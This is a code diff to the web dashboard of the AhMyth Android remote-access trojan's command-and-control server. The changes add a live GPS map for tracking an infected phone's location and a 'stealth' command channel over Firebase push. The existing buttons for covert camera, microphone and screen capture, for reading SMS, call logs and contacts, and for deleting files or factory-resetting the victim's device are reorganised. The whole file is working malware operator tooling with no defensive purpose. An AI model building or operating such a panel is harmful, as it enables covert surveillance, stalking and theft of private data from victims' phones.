@@ -5,6 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>AhMyth C2 Dashboard</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
   *{margin:0;padding:0;box-sizing:border-box}
   :root{
@@ -51,8 +53,7 @@
     transition:all .3s;
   }
   .status-badge .dot{
-    width:8px;height:8px;border-radius:50%;
-    background:var(--text-dim);transition:all .3s;
+    width:8px;height:8px;border-radius:50%;background:var(--text-dim);transition:all .3s;
   }
   .status-badge.connected{border-color:var(--accent);color:var(--accent)}
   .status-badge.connected .dot{background:var(--accent);box-shadow:0 0 6px var(--accent);animation:pulse 2s infinite}
@@ -93,8 +94,7 @@
     color:var(--text-dim);font-size:13px;flex-direction:column;gap:8px;
   }
   .selection-prompt .key{
-    padding:4px 10px;background:var(--surface2);border-radius:4px;
-    border:1px solid var(--border);font-size:11px;
+    padding:4px 10px;background:var(--surface2);border-radius:4px;border:1px solid var(--border);font-size:11px;
   }
 
   .command-panel{display:none;flex-direction:column;flex:1;overflow:hidden}
@@ -102,18 +102,40 @@
 
   .command-toolbar{
     padding:8px 16px;background:var(--surface);border-bottom:1px solid var(--border);
-    display:flex;align-items:center;justify-content:space-between;flex-shrink:0;
+    display:flex;align-items:center;justify-content:space-between;flex-shrink:0;flex-wrap:wrap;gap:6px;
   }
-  .command-toolbar .device-label{
-    font-size:12px;color:var(--text-dim);
-  }
+  .command-toolbar .device-label{font-size:12px;color:var(--text-dim)}
   .command-toolbar .device-label strong{color:var(--text)}
+  .command-toolbar .right-group{display:flex;gap:6px;flex-wrap:wrap}
 
-  .command-groups{
-    display:flex;gap:8px;flex-wrap:wrap;
+  /* TAB BAR */
+  .tab-bar{
+    display:flex;background:var(--surface);border-bottom:1px solid var(--border);flex-shrink:0;
   }
-  .cmd-group-label{font-size:9px;text-transform:uppercase;letter-spacing:1px;color:var(--text-dim);width:100%;margin:4px 0 2px}
-  .cmd-group-label:first-child{margin-top:0}
+  .tab-btn{
+    padding:8px 18px;font-size:11px;font-family:inherit;color:var(--text-dim);
+    background:none;border:none;cursor:pointer;border-bottom:2px solid transparent;
+    transition:all .15s;display:flex;align-items:center;gap:5px;
+  }
+  .tab-btn:hover{color:var(--text);background:var(--surface2)}
+  .tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
+  .tab-btn .badge{
+    font-size:9px;background:var(--accent);color:#000;border-radius:8px;
+    padding:0 5px;font-weight:600;display:none;
+  }
+  .tab-btn .badge.show{display:inline}
+  .tab-panel{display:none;flex:1;overflow:hidden;flex-direction:column}
+  .tab-panel.active{display:flex}
+
+  /* COMMANDS TAB */
+  .cmd-scroll{overflow-y:auto;padding:12px 16px;flex:1}
+  .cmd-section{margin-bottom:16px}
+  .cmd-section-title{
+    font-size:10px;text-transform:uppercase;letter-spacing:1.5px;
+    color:var(--text-dim);margin-bottom:8px;padding-bottom:4px;
+    border-bottom:1px solid var(--border);
+  }
+  .cmd-grid{display:flex;flex-wrap:wrap;gap:6px}
 
   .cmd-btn{
     padding:6px 12px;border-radius:6px;border:1px solid var(--border);
@@ -142,7 +164,7 @@
 
   /* LOG */
   .log-header{
-    padding:8px 16px;background:var(--surface);border-bottom:1px solid var(--border);
+    padding:8px 16px;background:var(--surface);border-top:1px solid var(--border);
     display:flex;justify-content:space-between;align-items:center;flex-shrink:0;
   }
   .log-header .title{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text-dim)}
@@ -154,14 +176,13 @@
   }
   .log-header .actions button:hover{border-color:var(--text);color:var(--text)}
 
-  .log-container{flex:1;overflow-y:auto;padding:8px 16px;background:var(--bg)}
+  .log-container{flex:1;overflow-y:auto;padding:8px 16px;background:var(--bg);max-height:180px}
   .log-empty{
-    text-align:center;padding:40px;color:var(--text-dim);
-    font-size:12px;line-height:1.8;
+    text-align:center;padding:20px;color:var(--text-dim);font-size:11px;line-height:1.8;
   }
 
   .log-entry{
-    padding:6px 0;border-bottom:1px solid rgba(30,45,61,0.3);
+    padding:4px 0;border-bottom:1px solid rgba(30,45,61,0.3);
     font-size:11px;line-height:1.5;animation:fadeIn .2s ease;
   }
   @keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
@@ -179,37 +200,69 @@
   .log-entry.type-error{border-left:2px solid var(--red);padding-left:8px}
   .log-entry.type-system{border-left:2px solid var(--blue);padding-left:8px}
 
+  .log-entry .map-btn{
+    display:inline-block;padding:1px 6px;border-radius:3px;font-size:9px;
+    background:var(--surface2);border:1px solid var(--accent-dim);
+    color:var(--accent);cursor:pointer;margin-left:6px;font-family:inherit;
+  }
+  .log-entry .map-btn:hover{background:var(--accent);color:#000}
+
+  /* ===== MAP TAB ===== */
+  .map-container{flex:1;position:relative;background:var(--bg);overflow:hidden;min-height:200px}
+  .map-container #gpsMap{width:100%;height:100%;position:absolute;top:0;left:0}
+  .map-container .coords-card{
+    position:absolute;bottom:20px;left:20px;z-index:1000;
+    background:var(--surface);border:1px solid var(--border);
+    border-radius:10px;padding:12px 16px;min-width:200px;
+    box-shadow:0 4px 20px rgba(0,0,0,0.5);
+    font-size:11px;display:none;
+  }
+  .map-container .coords-card.visible{display:block;animation:slideUp .3s ease}
+  @keyframes slideUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+  .map-container .coords-card .coord-row{display:flex;justify-content:space-between;gap:12px;padding:2px 0}
+  .map-container .coords-card .coord-label{color:var(--text-dim)}
+  .map-container .coords-card .coord-value{color:var(--accent);font-weight:600}
+  .map-container .coords-card .coord-time{color:var(--text-dim);font-size:9px;margin-top:4px;padding-top:4px;border-top:1px solid var(--border)}
+
+  .map-container .map-watermark{
+    position:absolute;top:12px;right:12px;z-index:1000;
+    font-size:9px;color:var(--text-dim);opacity:0.6;
+    background:var(--surface);padding:3px 8px;border-radius:4px;
+    pointer-events:none;
+  }
+
+  /* Pulsing marker */
+  .pulse-marker{background:var(--accent);border:3px solid #fff;border-radius:50%;width:18px;height:18px;box-shadow:0 0 0 rgba(0,212,170,0.4);animation:pulse-marker 2s infinite}
+  .pulse-marker::after{content:'';position:absolute;top:-6px;left:-6px;width:30px;height:30px;border-radius:50%;background:rgba(0,212,170,0.15);animation:pulse-ring 2s infinite}
+  @keyframes pulse-marker{0%{box-shadow:0 0 0 0 rgba(0,212,170,0.4)}70%{box-shadow:0 0 0 12px rgba(0,212,170,0)}100%{box-shadow:0 0 0 0 rgba(0,212,170,0)}}
+  @keyframes pulse-ring{0%{transform:scale(0.5);opacity:0}50%{opacity:0.3}100%{transform:scale(1.5);opacity:0}}
+
+  /* Map popup custom */
+  .gps-popup .leaflet-popup-content-wrapper{background:var(--surface);color:var(--text);border-radius:8px;border:1px solid var(--border);font-family:inherit}
+  .gps-popup .leaflet-popup-tip{background:var(--surface);border:1px solid var(--border)}
+  .gps-popup .leaflet-popup-content{margin:8px 12px;font-size:11px;line-height:1.6}
+  .gps-popup .popup-title{color:var(--accent);font-weight:600;font-size:12px;margin-bottom:4px}
+
   /* RESPONSIVE */
   @media(max-width:768px){
     .main{flex-direction:column}
-    .sidebar{width:100%;max-height:200px;border-right:none;border-bottom:1px solid var(--border)}
+    .sidebar{width:100%;max-height:150px;border-right:none;border-bottom:1px solid var(--border)}
     .sidebar-header{flex-shrink:0}
     .header{flex-wrap:wrap;gap:8px}
-    .command-groups{gap:4px}
+    .cmd-grid{gap:4px}
     .cmd-btn{font-size:10px;padding:4px 8px}
+    .map-container .coords-card{bottom:10px;left:10px;right:10px;min-width:auto}
   }
 
   @media (prefers-reduced-motion:reduce){
     *{animation-duration:0.01ms!important;transition-duration:0.01ms!important}
   }
 
-  /* Interactive command buttons area */
-  .cmd-scroll{
-    overflow-y:auto;padding:12px 16px;flex:1;
-  }
-  .cmd-section{margin-bottom:16px}
-  .cmd-section-title{
-    font-size:10px;text-transform:uppercase;letter-spacing:1.5px;
-    color:var(--text-dim);margin-bottom:8px;padding-bottom:4px;
-    border-bottom:1px solid var(--border);
-  }
-  .cmd-grid{display:flex;flex-wrap:wrap;gap:6px}
-
-  /* JSON viewer */
   .json-preview{
     background:var(--surface2);border:1px solid var(--border);
-    border-radius:6px;padding:8px 12px;margin-top:4px;
-    font-size:10px;color:var(--text-dim);max-height:200px;overflow:auto;
+    border-radius:6px;padding:6px 10px;margin-top:3px;
+    font-size:10px;color:var(--text-dim);max-height:150px;overflow:auto;
     white-space:pre-wrap;font-family:inherit;
   }
 </style>
@@ -226,6 +279,7 @@
   </div>
   <div class="header-right">
     <span>Devices: <span class="device-count" id="deviceCount">0</span></span>
+    <span id="fcmStatus" style="font-size:10px;color:var(--text-dim)"></span>
     <span id="serverInfo">Connecting...</span>
   </div>
 </div>
@@ -255,16 +309,19 @@
       <span class="key">or wait for one to connect</span>
     </div>
 
-    <!-- Command panel (hidden until device selected) -->
+    <!-- Command panel -->
     <div class="command-panel" id="commandPanel">
       <div class="command-toolbar">
         <div class="device-label">
           Target: <strong id="selectedDeviceName">—</strong>
           <span id="selectedDeviceMeta" style="font-size:10px;color:var(--text-dim);margin-left:8px"></span>
         </div>
-        <div class="cmd-groups">
+        <div class="right-group">
           <button class="cmd-btn" onclick="sendRawCommand()" title="Send a custom JSON command">
             <span class="icon">⚡</span> Raw
+          </button>
+          <button class="cmd-btn" id="fcmToggleBtn" onclick="toggleFcmMode()" title="Toggle FCM stealth mode" style="font-size:10px">
+            <span class="icon">🔥</span> <span id="fcmModeLabel">Socket.IO</span>
           </button>
         </div>
       </div>
@@ -276,51 +333,70 @@
         <button class="cmd-btn" onclick="sendRawCommand()">Send</button>
       </div>
 
-      <div class="cmd-scroll">
-        <!-- Surveillance -->
-        <div class="cmd-section">
-          <div class="cmd-section-title">📷 Surveillance</div>
-          <div class="cmd-grid">
-            <button class="cmd-btn" onclick="sendCmd('x0000ca','camList')"><span class="icon">📋</span> Camera List</button>
-            <button class="cmd-btn" onclick="sendCmd('x0000ca','0')"><span class="icon">🤳</span> Front Camera</button>
-            <button class="cmd-btn" onclick="sendCmd('x0000ca','1')"><span class="icon">📸</span> Back Camera</button>
-            <button class="cmd-btn" onclick="sendMicCmd()"><span class="icon">🎤</span> Microphone</button>
-            <button class="cmd-btn" onclick="sendCmd('x0000sc','')"><span class="icon">🖥️</span> Screen Capture</button>
-            <button class="cmd-btn" onclick="sendCmd('x0000lm','')"><span class="icon">📍</span> GPS Location</button>
+      <!-- TABS -->
+      <div class="tab-bar">
+        <button class="tab-btn active" data-tab="commands" onclick="switchTab('commands')">
+          ⌨️ Commands
+        </button>
+        <button class="tab-btn" data-tab="map" onclick="switchTab('map')">
+          🗺️ Map <span class="badge" id="mapBadge">!</span>
+        </button>
+      </div>
+
+      <!-- COMMANDS TAB -->
+      <div class="tab-panel active" id="tabCommands">
+        <div class="cmd-scroll">
+          <div class="cmd-section">
+            <div class="cmd-section-title">📷 Surveillance</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" onclick="sendCmd('x0000ca','camList')"><span class="icon">📋</span> Camera List</button>
+              <button class="cmd-btn" onclick="sendCmd('x0000ca','0')"><span class="icon">🤳</span> Front Camera</button>
+              <button class="cmd-btn" onclick="sendCmd('x0000ca','1')"><span class="icon">📸</span> Back Camera</button>
+              <button class="cmd-btn" onclick="sendMicCmd()"><span class="icon">🎤</span> Microphone</button>
+              <button class="cmd-btn" onclick="sendCmd('x0000sc','')"><span class="icon">🖥️</span> Screen Capture</button>
+              <button class="cmd-btn" onclick="sendCmd('x0000lm','')"><span class="icon">📍</span> GPS Location</button>
+            </div>
+          </div>
+          <div class="cmd-section">
+            <div class="cmd-section-title">📁 Data Exfiltration</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" onclick="sendCmd('x0000sm','ls')"><span class="icon">💬</span> Read SMS</button>
+              <button class="cmd-btn" onclick="sendCmd('x0000cl','')"><span class="icon">📞</span> Call Logs</button>
+              <button class="cmd-btn" onclick="sendCmd('x0000cn','')"><span class="icon">👤</span> Contacts</button>
+              <button class="cmd-btn" onclick="sendCmd('x0000apps','')"><span class="icon">📱</span> Installed Apps</button>
+            </div>
+          </div>
+          <div class="cmd-section">
+            <div class="cmd-section-title">⚡ Actions</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" onclick="sendFileListCmd()"><span class="icon">📂</span> File List</button>
+              <button class="cmd-btn" onclick="sendDialCmd()"><span class="icon">📲</span> Dial Number</button>
+              <button class="cmd-btn" onclick="sendUrlCmd()"><span class="icon">🌐</span> Open URL</button>
+              <button class="cmd-btn" onclick="sendAppCmd()"><span class="icon">🚀</span> Launch App</button>
+              <button class="cmd-btn warning" onclick="sendDeleteCmd()"><span class="icon">🗑️</span> Delete File</button>
+            </div>
+          </div>
+          <div class="cmd-section">
+            <div class="cmd-section-title">🔐 Device Admin</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn warning" onclick="sendCmd('x0000lockDevice','')"><span class="icon">🔒</span> Lock Device</button>
+              <button class="cmd-btn danger" onclick="confirmWipe()"><span class="icon">💀</span> Wipe Device</button>
+              <button class="cmd-btn danger" onclick="confirmReboot()"><span class="icon">🔄</span> Reboot Device</button>
+            </div>
           </div>
         </div>
+      </div>
 
-        <!-- Data Exfiltration -->
-        <div class="cmd-section">
-          <div class="cmd-section-title">📁 Data Exfiltration</div>
-          <div class="cmd-grid">
-            <button class="cmd-btn" onclick="sendCmd('x0000sm','ls')"><span class="icon">💬</span> Read SMS</button>
-            <button class="cmd-btn" onclick="sendCmd('x0000cl','')"><span class="icon">📞</span> Call Logs</button>
-            <button class="cmd-btn" onclick="sendCmd('x0000cn','')"><span class="icon">👤</span> Contacts</button>
-            <button class="cmd-btn" onclick="sendCmd('x0000apps','')"><span class="icon">📱</span> Installed Apps</button>
-            <button class="cmd-btn" onclick="sendFileListCmd()"><span class="icon">📂</span> File List</button>
-            <button class="cmd-btn" onclick="sendFileDlCmd()"><span class="icon">⬇️</span> Download File</button>
-          </div>
-        </div>
-
-        <!-- Actions -->
-        <div class="cmd-section">
-          <div class="cmd-section-title">⚡ Actions</div>
-          <div class="cmd-grid">
-            <button class="cmd-btn" onclick="sendDialCmd()"><span class="icon">📲</span> Dial Number</button>
-            <button class="cmd-btn" onclick="sendUrlCmd()"><span class="icon">🌐</span> Open URL</button>
-            <button class="cmd-btn" onclick="sendAppCmd()"><span class="icon">🚀</span> Launch App</button>
-            <button class="cmd-btn warning" onclick="sendDeleteCmd()"><span class="icon">🗑️</span> Delete File</button>
-          </div>
-        </div>
-
-        <!-- Device Admin -->
-        <div class="cmd-section">
-          <div class="cmd-section-title">🔐 Device Admin</div>
-          <div class="cmd-grid">
-            <button class="cmd-btn warning" onclick="sendCmd('x0000lockDevice','')"><span class="icon">🔒</span> Lock Device</button>
-            <button class="cmd-btn danger" onclick="confirmWipe()"><span class="icon">💀</span> Wipe Device</button>
-            <button class="cmd-btn danger" onclick="confirmReboot()"><span class="icon">🔄</span> Reboot Device</button>
+      <!-- MAP TAB -->
+      <div class="tab-panel" id="tabMap">
+        <div class="map-container">
+          <div id="gpsMap"></div>
+          <div class="map-watermark">AhMyth GPS Tracker</div>
+          <div class="coords-card" id="coordsCard">
+            <div class="coord-row"><span class="coord-label">Latitude</span><span class="coord-value" id="coordLat">—</span></div>
+            <div class="coord-row"><span class="coord-label">Longitude</span><span class="coord-value" id="coordLng">—</span></div>
+            <div class="coord-row"><span class="coord-label">Accuracy</span><span class="coord-value" id="coordAcc">—</span></div>
+            <div class="coord-time" id="coordTime">—</div>
           </div>
         </div>
       </div>
@@ -351,6 +427,12 @@ let socket = null;
 let selectedDeviceId = null;
 let autoScroll = true;
 let devices = {};
+let gpsMap = null;
+let gpsMarker = null;
+let gpsMarkerIcon = null;
+let mapInitialized = false;
+let mapHasData = false;
+let pendingGpsData = null;
 
 // ============================================================
 // SOCKET CONNECTION
@@ -383,7 +465,6 @@ function connect() {
     document.getElementById('serverInfo').textContent = 'Error: ' + err.message;
   });
 
-  // Device list updates
   socket.on('devices:update', (deviceList) => {
     devices = {};
     deviceList.forEach((d) => { devices[d.socketId] = d; });
@@ -392,22 +473,142 @@ function connect() {
     document.getElementById('deviceListCount').textContent = deviceList.length;
   });
 
-  // Response from device
   socket.on('device:response', (payload) => {
     const { socketId, deviceInfo, event, data, timestamp } = payload;
     const label = deviceInfo ? `${deviceInfo.model}` : socketId.substring(0, 8);
-    const time = formatTime(timestamp);      addLog('received', `[${label}] <span class="log-event">${event}</span>`, data, timestamp);
+    addLog('received', `[${label}] <span class="log-event">${event}</span>`, data, timestamp, event, data);
   });
 
-  // Command sent acknowledgement
   socket.on('command:sent', (payload) => {
     addLog('sent', `Command forwarded to device`, payload.command, payload.timestamp);
   });
 
-  // Command error
   socket.on('command:error', (payload) => {
     addLog('error', payload.message);
   });
+
+  socket.on('fcm:status', (status) => {
+    const el = document.getElementById('fcmStatus');
+    if (status.available) {
+      el.innerHTML = `🔥 FCM: <span style="color:var(--accent)">Active</span>`;
+      el.title = `${status.devices} devices registered via FCM`;
+      localStorage.setItem('fcmAvailable', 'true');
+    } else {
+      el.innerHTML = `🔥 FCM: <span style="color:var(--text-dim)">Not configured</span>`;
+      el.title = 'See FCM_SETUP.md to enable stealth C2 channel';
+      localStorage.setItem('fcmAvailable', 'false');
+    }
+  });
+}
+
+// ============================================================
+// GPS MAP
+// ============================================================
+function initMap() {
+  if (mapInitialized) return;
+  mapInitialized = true;
+
+  // Dark tile layer: CartoDB dark
+  const tileUrl = 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png';
+  const attribution = '&copy; <a href="https://www.openstreetmap.org/copyright" style="color:#5a7a9a">OSM</a> &copy; <a href="https://carto.com/" style="color:#5a7a9a">CARTO</a>';
+
+  gpsMap = L.map('gpsMap', {
+    center: [20, 0],
+    zoom: 2,
+    zoomControl: true,
+    attributionControl: true,
+  });
+
+  L.tileLayer(tileUrl, { attribution, maxZoom: 19 }).addTo(gpsMap);
+
+  // Custom pulsing marker icon
+  gpsMarkerIcon = L.divIcon({
+    className: '',
+    html: '<div class="pulse-marker"></div>',
+    iconSize: [18, 18],
+    iconAnchor: [9, 9],
+    popupAnchor: [0, -14],
+  });
+
+  // Fix Leaflet popup styles for dark theme
+  document.querySelectorAll('.leaflet-popup-close-button').forEach(el => {
+    el.style.color = '#5a7a9a';
+  });
+
+  // Handle pending GPS data if any
+  if (pendingGpsData) {
+    plotGpsPoint(pendingGpsData);
+    pendingGpsData = null;
+  }
+}
+
+function plotGpsPoint(data) {
+  // Ensure map is initialized before plotting
+  if (!mapInitialized) {
+    initMap();
+  }
+  // If still not initialized (CDN not loaded?), queue it
+  if (!mapInitialized) {
+    pendingGpsData = data;
+    return;
+  }
+
+  const lat = parseFloat(data.lat || data.latitude || 0);
+  const lng = parseFloat(data.lng || data.longitude || 0);
+  if (!lat && !lng) return;
+
+  if (gpsMarker) {
+    gpsMap.removeLayer(gpsMarker);
+  }
+
+  const popupHtml = `
+    <div class="popup-title">📍 Device Location</div>
+    <div><span style="color:#5a7a9a">Lat:</span> <strong style="color:#00d4aa">${lat.toFixed(6)}</strong></div>
+    <div><span style="color:#5a7a9a">Lng:</span> <strong style="color:#00d4aa">${lng.toFixed(6)}</strong></div>
+    <div style="margin-top:4px;font-size:10px;color:#5a7a9a">
+      ${data.enable !== false ? 'GPS enabled' : 'GPS disabled'}
+      ${data.accuracy ? '· ±' + data.accuracy + 'm' : ''}
+    </div>
+  `;
+
+  gpsMarker = L.marker([lat, lng], { icon: gpsMarkerIcon })
+    .addTo(gpsMap)
+    .bindPopup(popupHtml, { className: 'gps-popup', closeButton: true });
+
+  gpsMap.setView([lat, lng], 15, { animate: true });
+
+  // Update coords card
+  document.getElementById('coordLat').textContent = lat.toFixed(6);
+  document.getElementById('coordLng').textContent = lng.toFixed(6);
+  document.getElementById('coordAcc').textContent = data.accuracy ? `${data.accuracy}m` : 'N/A';
+  document.getElementById('coordTime').textContent = `Last updated: ${new Date().toLocaleString()}`;
+  document.getElementById('coordsCard').classList.add('visible');
+
+  mapHasData = true;
+}
+
+function focusMap() {
+  switchTab('map');
+  if (gpsMap) {
+    gpsMap.invalidateSize();
+  }
+}
+
+// ============================================================
+// TABS
+// ============================================================
+function switchTab(name) {
+  document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+
+  document.querySelector(`.tab-btn[data-tab="${name}"]`).classList.add('active');
+  document.getElementById(`tab${name.charAt(0).toUpperCase() + name.slice(1)}`).classList.add('active');
+
+  if (name === 'map' && gpsMap) {
+    // Delay to let the tab render
+    setTimeout(() => gpsMap.invalidateSize(), 50);
+    document.getElementById('mapBadge').classList.remove('show');
+  }
 }
 
 // ============================================================
@@ -430,12 +631,11 @@ function renderDevices() {
 
   if (ids.length === 0) {
     container.innerHTML = `
-      <div class="device-empty" id="deviceEmpty">
+      <div class="device-empty">
         <span class="icon">📡</span>
         Waiting for a device to connect...<br>
         <span style="font-size:10px">Install the APK and open it</span>
       </div>`;
-    // If a device was selected, deselect
     if (selectedDeviceId) {
       selectedDeviceId = null;
       showSelectionPrompt();
@@ -461,7 +661,6 @@ function renderDevices() {
   });
   container.innerHTML = html;
 
-  // Re-select if still valid
   if (selectedDeviceId && devices[selectedDeviceId]) {
     showCommandPanel(selectedDeviceId);
   } else if (ids.length === 1) {
@@ -488,7 +687,7 @@ function showCommandPanel(id) {
 
   const d = devices[id];
   if (d) {
-    document.getElementById('selectedDeviceName').textContent = `${d.model || 'Unknown'}`;
+    document.getElementById('selectedDeviceName').textContent = d.model || 'Unknown';
     document.getElementById('selectedDeviceMeta').textContent =
       `${d.manufacturer || '?'} · Android ${d.androidVersion || '?'} · ${(d.deviceId || '').substring(0, 12)}`;
   }
@@ -514,10 +713,8 @@ function getTarget() {
 function sendCmd(order, extra) {
   const target = getTarget();
   if (!target) return;
-
   const command = { order };
   if (extra !== '') command.extra = extra;
-
   socket.emit('command:send', { targetSocketId: target, command });
   const label = devices[target] ? devices[target].model : target.substring(0, 8);
   addLog('sent', `→ [${label}] <span class="log-event">${order}</span>`, command);
@@ -529,7 +726,6 @@ function sendRawCommand() {
     const command = JSON.parse(input.value);
     const target = getTarget();
     if (!target) return;
-
     socket.emit('command:send', { targetSocketId: target, command });
     const label = devices[target] ? devices[target].model : target.substring(0, 8);
     addLog('sent', `→ [${label}] <span class="log-event">${command.order || 'custom'}</span>`, command);
@@ -540,9 +736,7 @@ function sendRawCommand() {
 
 function sendMicCmd() {
   const sec = prompt('Recording duration (seconds):', '5');
-  if (sec !== null && !isNaN(sec) && sec > 0) {
-    sendCmd('x0000mc', parseInt(sec));
-  }
+  if (sec !== null && !isNaN(sec) && sec > 0) sendCmd('x0000mc', parseInt(sec));
 }
 
 function sendFileListCmd() {
@@ -550,60 +744,42 @@ function sendFileListCmd() {
   if (path !== null) {
     const target = getTarget();
     if (!target) return;
-    const command = { order: 'x0000fm', extra: 'ls', path: path };
+    const command = { order: 'x0000fm', extra: 'ls', path };
     socket.emit('command:send', { targetSocketId: target, command });
     const label = devices[target] ? devices[target].model : target.substring(0, 8);
     addLog('sent', `→ [${label}] <span class="log-event">x0000fm</span>`, command);
   }
 }
 
-function sendFileDlCmd() {
-  const path = prompt('Full file path to download:', '/storage/emulated/0/example.txt');
-  if (path !== null) {
-    const target = getTarget();
-    if (!target) return;
-    const command = { order: 'x0000fm', extra: 'dl', path: path };
-    socket.emit('command:send', { targetSocketId: target, command });
-    const label = devices[target] ? devices[target].model : target.substring(0, 8);
-    addLog('sent', `→ [${label}] <span class="log-event">x0000fm (download)</span>`, command);
-  }
-}
-
 function sendDialCmd() {
-  const number = prompt('Phone number to dial:', '+1234567890');
-  if (number !== null) {
-    sendCmd('x0000dm', number);
-  }
+  const number = prompt('Phone number:', '+1234567890');
+  if (number !== null) sendCmd('x0000dm', number);
 }
 
 function sendUrlCmd() {
-  const url = prompt('URL to open:', 'https://example.com');
-  if (url !== null) {
-    sendCmd('x0000openUrl', url);
-  }
+  const url = prompt('URL:', 'https://example.com');
+  if (url !== null) sendCmd('x0000openUrl', url);
 }
 
 function sendAppCmd() {
-  const pkg = prompt('Package name to launch:', 'com.android.chrome');
-  if (pkg !== null) {
-    sendCmd('x0000runApp', pkg);
-  }
+  const pkg = prompt('Package name:', 'com.android.chrome');
+  if (pkg !== null) sendCmd('x0000runApp', pkg);
 }
 
 function sendDeleteCmd() {
-  const path = prompt('File/folder path to delete:', '/storage/emulated/0/target.txt');
+  const path = prompt('File/folder path:', '/storage/emulated/0/target.txt');
   if (path !== null) {
     const target = getTarget();
     if (!target) return;
     const command = { order: 'x0000deleteFF', fileFolderPath: path };
-    socket.emit('command:send', { targetSocketId: target, command });
     const label = devices[target] ? devices[target].model : target.substring(0, 8);
+    socket.emit('command:send', { targetSocketId: target, command });
     addLog('sent', `→ [${label}] <span class="log-event">x0000deleteFF</span>`, command);
   }
 }
 
 function confirmWipe() {
-  if (confirm('⚠️ WARNING: This will FACTORY RESET the device!\n\nAre you absolutely sure?')) {
+  if (confirm('⚠️ This will FACTORY RESET the device! Continue?')) {
     if (confirm('LAST CHANCE: All data will be permanently erased. Continue?')) {
       sendCmd('x0000wipeDevice', '');
     }
@@ -611,15 +787,77 @@ function confirmWipe() {
 }
 
 function confirmReboot() {
-  if (confirm('Reboot the device?')) {
-    sendCmd('x0000rebootDevice', '');
-  }
+  if (confirm('Reboot the device?')) sendCmd('x0000rebootDevice', '');
 }
 
 // ============================================================
-// LOG
+// FCM MODE TOGGLE
 // ============================================================
-function addLog(type, message, data, timestamp) {
+let fcmMode = localStorage.getItem('fcmMode') === 'true';
+
+function toggleFcmMode() {
+  fcmMode = !fcmMode;
+  localStorage.setItem('fcmMode', String(fcmMode));
+  document.getElementById('fcmModeLabel').textContent = fcmMode ? 'FCM' : 'Socket.IO';
+  const btn = document.getElementById('fcmToggleBtn');
+  if (fcmMode) {
+    btn.style.borderColor = 'var(--accent)';
+    btn.style.color = 'var(--accent)';
+  } else {
+    btn.style.borderColor = '';
+    btn.style.color = '';
+  }
+  addLog('system', `Switched to ${fcmMode ? '🔥 FCM stealth channel' : '📡 Socket.IO persistent channel'}`);
+}
+
+// Override sendCmd to support FCM mode
+const _originalSendCmd = sendCmd;
+sendCmd = function(order, extra) {
+  const target = getTarget();
+  if (!target) return;
+  const command = { order };
+  if (extra !== '') command.extra = extra;
+
+  if (fcmMode) {
+    // Send via FCM push endpoint
+    const proto = window.location.protocol;
+    const host = window.location.hostname || 'localhost';
+    const port = window.location.port || '42474';
+    // Force HTTP for FCM API (C2 server doesn't support HTTPS)
+    const url = `http://${host}:${port}/api/fcm/push`;
+
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        targetDeviceId: target,
+        command: command,
+      }),
+    })
+    .then(r => r.json())
+    .then(result => {
+      if (result.status === 'sent') {
+        const label = devices[target] ? devices[target].model : target.substring(0, 8);
+        addLog('sent', `🔥 [${label}] <span class="log-event">${order}</span> (via FCM)`, command);
+      } else {
+        addLog('error', `FCM push failed: ${result.error || 'Unknown error'}`);
+      }
+    })
+    .catch(err => {
+      addLog('error', `FCM push error: ${err.message}`);
+    });
+  } else {
+    // Original Socket.IO path
+    socket.emit('command:send', { targetSocketId: target, command });
+    const label = devices[target] ? devices[target].model : target.substring(0, 8);
+    addLog('sent', `→ [${label}] <span class="log-event">${order}</span>`, command);
+  }
+};
+
+// ============================================================
+// LOG + GPS HANDLER
+// ============================================================
+function addLog(type, message, data, timestamp, event, rawData) {
   const container = document.getElementById('logContainer');
   const empty = document.getElementById('logEmpty');
   if (empty) empty.style.display = 'none';
@@ -634,22 +872,37 @@ function addLog(type, message, data, timestamp) {
     }
   }
 
+  let actions = '';
+  // If this is a GPS location response, add a "Show on Map" button
+  if (event === 'x0000lm' && rawData) {
+    const lat = parseFloat(rawData.lat || rawData.latitude || 0);
+    const lng = parseFloat(rawData.lng || rawData.longitude || 0);
+    if (lat || lng) {
+      actions = `<button class="map-btn" onclick="plotGpsPoint(${JSON.stringify(rawData)}); focusMap();">🗺️ Show on Map</button>`;
+    }
+  }
+
   const entry = document.createElement('div');
   entry.className = `log-entry type-${type}`;
-  entry.innerHTML = `<span class="log-time">${time}</span> ${message} ${dataStr}`;
-
+  entry.innerHTML = `<span class="log-time">${time}</span> ${message} ${actions} ${dataStr}`;
   container.appendChild(entry);
 
-  if (autoScroll) {
-    container.scrollTop = container.scrollHeight;
+  if (autoScroll) container.scrollTop = container.scrollHeight;
+
+  // Auto-plot GPS data
+  if (event === 'x0000lm' && rawData) {
+    const lat = parseFloat(rawData.lat || rawData.latitude || 0);
+    const lng = parseFloat(rawData.lng || rawData.longitude || 0);
+    if (lat || lng) {
+      plotGpsPoint(rawData);
+      // Show badge on Map tab
+      document.getElementById('mapBadge').classList.add('show');
+    }
   }
 }
 
 function clearLog() {
-  const container = document.getElementById('logContainer');
-  container.innerHTML = `<div class="log-empty" id="logEmpty">
-    Log cleared. Responses will appear here.
-  </div>`;
+  document.getElementById('logContainer').innerHTML = `<div class="log-empty" id="logEmpty">Log cleared. Responses will appear here.</div>`;
 }
 
 function toggleAutoScroll() {
@@ -681,6 +934,12 @@ function syntaxHighlight(json) {
 // ============================================================
 document.addEventListener('DOMContentLoaded', () => {
   connect();
+  // Init map on first interaction with Map tab or GPS data
